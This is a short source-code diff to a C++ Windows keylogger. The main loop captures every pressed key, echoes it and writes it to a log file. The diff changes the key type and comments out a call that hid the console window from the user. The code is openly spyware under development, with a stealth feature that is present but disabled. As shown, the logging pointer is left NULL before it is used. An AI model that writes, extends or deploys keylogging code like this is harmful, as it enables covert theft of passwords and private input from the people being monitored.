@@ -8,18 +8,18 @@ logManager* logManager::manager = NULL;
 
 int main()
 {
-    char key = 0;
+    keyStroke key;
 
     logManager* manager = NULL;
 
-    windowManager::hideConsoleWindow();
+    //windowManager::hideConsoleWindow();
 
     // Mainloop that logs the keystrokes.
     while(TRUE)
     {
         key = keyLogger::checkPressedKey();
-        std::cout << key;
-        manager->writeCharToLog(key);
+        std::cout << key.getKeyCharacter();
+        manager->writeCharToLog(key.getKeyCharacter());
         Sleep(ITERATION_DELAY); 
     }
 	return 0;
